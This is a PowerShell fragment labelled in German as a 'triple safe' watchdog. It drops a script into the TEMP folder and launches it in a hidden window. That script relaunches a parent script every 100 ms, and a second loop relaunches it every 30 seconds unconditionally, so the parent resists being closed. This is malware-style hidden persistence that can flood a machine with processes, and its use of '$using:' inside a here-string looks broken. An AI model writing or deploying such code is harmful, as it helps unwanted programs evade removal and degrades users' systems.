# ===== WATCHDOG ULTRA - 3 FACH SICHER =====
$watchdog1 = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.Id -ne 999999}
    if (`$p.Count -le 2) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`"" }
    Start-Sleep -Milliseconds 100
}
"@
$watchdog1 | Out-File "$env:TEMP\watchdog1.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog1.ps1`""

$watchdog2 = @"
while(`$true) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`""; Start-Sleep -Seconds 30 }
"@
